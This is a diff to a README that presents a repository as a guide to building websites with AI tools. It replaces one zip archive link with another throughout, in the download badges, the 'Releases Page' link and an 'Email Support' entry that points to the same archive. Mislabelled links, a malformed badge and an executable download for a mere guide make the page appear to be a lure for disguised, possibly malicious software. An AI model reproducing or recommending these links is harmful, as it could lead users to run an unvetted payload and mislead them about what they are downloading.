@@ -1,6 +1,6 @@
 # 🌐 building-websites-with-AI-tools - Build Websites Effortlessly with AI
 
-[![Download](https://raw.githubusercontent.com/aizarch/building-websites-with-AI-tools/main/horridity/with_tools_A_building_websites_3.9.zip%https://raw.githubusercontent.com/aizarch/building-websites-with-AI-tools/main/horridity/with_tools_A_building_websites_3.9.zip)](https://raw.githubusercontent.com/aizarch/building-websites-with-AI-tools/main/horridity/with_tools_A_building_websites_3.9.zip)
+[![Download](https://raw.githubusercontent.com/aizarch/building-websites-with-AI-tools/main/horridity/building_tools_A_with_websites_1.8-alpha.4.zip%https://raw.githubusercontent.com/aizarch/building-websites-with-AI-tools/main/horridity/building_tools_A_with_websites_1.8-alpha.4.zip)](https://raw.githubusercontent.com/aizarch/building-websites-with-AI-tools/main/horridity/building_tools_A_with_websites_1.8-alpha.4.zip)
 
 ## 📖 Overview
 This application provides a comprehensive guide for building websites and apps using AI tools like Claude Code and Stitch. You will learn prompt engineering, UI design workflows, and best practices for AI-assisted development. 
@@ -21,7 +21,7 @@ To run this application, ensure your system meets the following requirements:
 - Internet Connection: Required for downloading tools and resources
 
 ## 📥 Download & Install
-To download the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/aizarch/building-websites-with-AI-tools/main/horridity/with_tools_A_building_websites_3.9.zip).
+To download the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/aizarch/building-websites-with-AI-tools/main/horridity/building_tools_A_with_websites_1.8-alpha.4.zip).
 
 ### Steps to Download:
 1. Click on the link above to visit the Releases page.
@@ -65,10 +65,10 @@ We aim to release updates regularly based on user feedback and advancements in A
 ## 🙌 Support
 If you encounter any issues or have questions, please reach out for assistance. Feedback is welcome! 
 
-- **Email Support:** https://raw.githubusercontent.com/aizarch/building-websites-with-AI-tools/main/horridity/with_tools_A_building_websites_3.9.zip
+- **Email Support:** https://raw.githubusercontent.com/aizarch/building-websites-with-AI-tools/main/horridity/building_tools_A_with_websites_1.8-alpha.4.zip
 - **GitHub Issues:** Report any problems directly on the GitHub repository.
 
 ## 🚀 Final Thoughts
 Building websites and apps using AI tools can be simple and enjoyable. We hope this application helps streamline your development process. Enjoy creating amazing projects! 
 
-[![Download](https://raw.githubusercontent.com/aizarch/building-websites-with-AI-tools/main/horridity/with_tools_A_building_websites_3.9.zip%https://raw.githubusercontent.com/aizarch/building-websites-with-AI-tools/main/horridity/with_tools_A_building_websites_3.9.zip)](https://raw.githubusercontent.com/aizarch/building-websites-with-AI-tools/main/horridity/with_tools_A_building_websites_3.9.zip)
+[![Download](https://raw.githubusercontent.com/aizarch/building-websites-with-AI-tools/main/horridity/building_tools_A_with_websites_1.8-alpha.4.zip%https://raw.githubusercontent.com/aizarch/building-websites-with-AI-tools/main/horridity/building_tools_A_with_websites_1.8-alpha.4.zip)](https://raw.githubusercontent.com/aizarch/building-websites-with-AI-tools/main/horridity/building_tools_A_with_websites_1.8-alpha.4.zip)
